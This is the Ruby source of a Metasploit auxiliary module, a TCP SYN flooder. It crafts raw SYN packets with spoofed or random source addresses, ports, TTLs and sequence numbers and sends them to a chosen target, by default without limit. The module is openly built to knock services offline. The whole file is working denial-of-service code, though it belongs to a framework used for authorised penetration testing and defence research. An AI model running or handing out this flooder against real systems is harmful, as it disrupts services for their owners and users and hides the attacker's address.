##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Capture
  include Msf::Auxiliary::Dos

  def initialize
    super(
      'Name' => 'TCP SYN Flooder',
      'Description' => 'A simple TCP SYN flooder',
      'Author' => 'kris katterjohn',
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SERVICE_DOWN],
        'SideEffects' => [],
        'Reliability' => []
      }
    )

    register_options([
      Opt::RPORT(80),
      OptAddress.new('SHOST', [false, 'The spoofable source address (else randomizes)']),
      OptInt.new('SPORT', [false, 'The source port (else randomizes)']),
      OptInt.new('NUM', [false, 'Number of SYNs to send (else unlimited)'])
    ])

    deregister_options('FILTER', 'PCAPFILE')
  end

  def sport
    datastore['SPORT'].to_i.zero? ? rand(1..65535) : datastore['SPORT'].to_i
  end

  def rport
    datastore['RPORT'].to_i
  end

  def srchost
    datastore['SHOST'] || [rand(0x100000000)].pack('N').unpack('C*').join('.')
  end

  def run
    open_pcap

    sent = 0
    num = datastore['NUM'] || 0

    print_status("SYN flooding #{rhost}:#{rport}...")

    p = PacketFu::TCPPacket.new
    p.ip_saddr = srchost
    p.ip_daddr = rhost
    p.tcp_dport = rport
    p.tcp_flags.syn = 1

    while (num <= 0) || (sent < num)
      p.ip_ttl = rand(128..255)
      p.tcp_win = rand(1..4096)
      p.tcp_sport = sport
      p.tcp_seq = rand(0x100000000)
      p.recalc
      break unless capture_sendto(p, rhost)

      sent += 1
    end

    close_pcap
  end
end
